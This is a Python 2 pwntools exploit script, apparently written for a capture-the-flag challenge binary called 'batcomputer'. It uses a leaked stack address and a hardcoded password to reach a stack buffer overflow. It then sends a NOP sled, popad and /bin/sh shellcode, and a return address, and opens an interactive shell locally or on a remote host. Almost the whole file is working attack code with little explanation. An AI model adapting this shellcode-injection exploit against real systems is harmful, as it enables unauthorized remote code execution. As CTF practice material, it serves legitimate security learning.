#!/usr/bin/python2

import sys
import os
import re
import struct
from pwn import *
import argparse

##use python2 not python3 for ease of generating strings for payloads 

################################################################################################################
#           Building Payload for Exploit
#
#
################################################################################################################


exe="./batcomputer"

libc=ELF("/usr/x86_64-linux-gnu/lib/libc.so.6")
elf=context.binary=ELF(exe, checksec=False)

#context.log_level="debug"
context.log_level="info"

def exploit_init():
    target=q_start()

    target.sendlineafter("> ", b'1')
    
    ##receives the leaked address as a string using recvS()
    leaked_adr=target.recvS()
    stack_adr=int(re.search(r"(0x[\w\d]+)", leaked_adr).group(0), 16)
    target.sendline(b'2')
    target.sendlineafter("Ok. Let's do this. Enter the password:", b'b4tp@$$w0rd!')
    

    g=cyclic_gen()
    offset=cyclic_find(b'vaaa')
    info("offset: %d :", offset)

    ###the shellcode that we are injecting here is too large for the buffer
    # since this shellcode uses so many pushes, it ends up overwriting values
    # we need to prepend our main shellcode with a popad() shellcode 
    # popad() will pop all of the registers beforehand

    shellcode=asm(shellcraft.amd64.popad())
    shellcode+=asm(shellcraft.amd64.linux.sh())
    #shellcode=asm(shellcraft.amd64.linux.sh())
    nops_num= asm(shellcraft.amd64.nop()) * (offset - len(shellcode))
        
    new_payload=flat(
            [
                nops_num,
                shellcode,
                stack_adr
             ]
    )
    
    target.sendlineafter("Enter the navigation commands:", new_payload)
    target.sendlineafter("> ", b'345')

    target.interactive()



################################################################################################################
#           Testing Exploit
#           Command line args used to switch between testing locally with qemu + testing remotely
#
################################################################################################################
x86_64_qemu_args=["qemu-x86_64", "-L", "/usr/x86_64-linux-gnu/"]

def q_start(argv=[], *a , **kwargs):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process(x86_64_qemu_args +[exe], *a, **kwargs)


################################################################################################################
#           Argparse template - more detailed/fine-grained command line controls
#
################################################################################################################

#def setup_options():
#    parser = argparse.ArgumentParser(description='Generate exploits for programs vulnerable to memory corruption vulnerabilities; includes functions for identifying/calculating address offset and padding, creating payloads and employing various common mitigation bypass techniques.')
#    parser.add_argument('-gdb', nargs='?', type=bool, default=False,  help='Run the program with gdb for debugging')
#    #parser.add_argument('--remote', help='Send the exploit to the remote target at [IP] [PORT]')
#    subparsers = parser.add_subparsers()
#    remote_subparser= subparsers.add_parser('remote', help='Send the exploit to the remote target at [IP] [PORT]')
#    remote_subparser.add_argument('IP', type=str,  help='IP Address of remote target')
#    remote_subparser.add_argument('PORT', type=int,  help='Port of remote target')
#    #subparsers = parser.add_subparsers()
#    #parser.add_argument('-write-payloads', action="store_true",  help='Option to retrieve file or files from generated list of all files on target device')
#    #parser.add_argument('-IP', type=int,  help='IP Address of remote target')
#    #parser.add_argument('-PORT', type=int,  help='Port of remote target')
#    args = parser.parse_args()
#    #remote_args = remote_subparser.parse_args()
#    return parser, args

#def exploit_preamble(parser, args):
#    r=args.remote
#    #payload_num=int(args.payloads)
#    #payload_data = '{"command":' + cmd + '}'
#    print("args:", args)
#    print("remote:", r)

################################################################################################################
#
################################################################################################################

if __name__ == '__main__':
    exploit_init()
    
